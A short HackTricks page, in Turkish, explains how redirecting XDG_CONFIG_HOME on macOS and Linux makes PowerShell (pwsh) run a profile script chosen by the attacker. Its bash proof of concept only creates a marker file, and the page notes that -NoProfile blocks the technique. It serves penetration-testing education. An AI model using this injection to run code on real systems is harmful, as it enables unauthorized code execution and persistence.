# macOS PowerShell Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `XDG_CONFIG_HOME` ve PowerShell profilleri

macOS ve Linux'ta PowerShell, XDG yapılandırma yollarını kullanır ve `pwsh` başlatıldığında kullanıcı profil betiklerini çalıştırır. `XDG_CONFIG_HOME` değerinin yönlendirilmesi, `powershell/profile.ps1` ile konsol ana bilgisayarına özgü `powershell/Microsoft.PowerShell_profile.ps1` dosyasını içeren dizini değiştirir; dolayısıyla buradaki kontrollü bir dosya, `-Command` payload'ından önce çalıştırılabilir.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/ps-config/powershell
cat >/tmp/ps-config/powershell/Microsoft.PowerShell_profile.ps1 <<'PS1'
New-Item -ItemType File -Path /tmp/powershell-profile-executed -Force | Out-Null
PS1

XDG_CONFIG_HOME=/tmp/ps-config pwsh -Command '$true'
```
Bu, Windows dışı platformlarda PowerShell 6+ (`pwsh`) için geçerlidir; Windows PowerShell farklı profile konumları kullanır. `pwsh -NoProfile`, profile yüklenmesini engeller. Ayrıca diğer PowerShell host'ları farklı script'ler seçebileceğinden `HOME` ve host'a özgü profile adlarını da inceleyin.

## References

- [1] [PowerShell environment değişkenleri ve XDG yolları](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables)
- [2] [PowerShell profilleri](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles)
{{#include ../../../banners/hacktricks-training.md}}
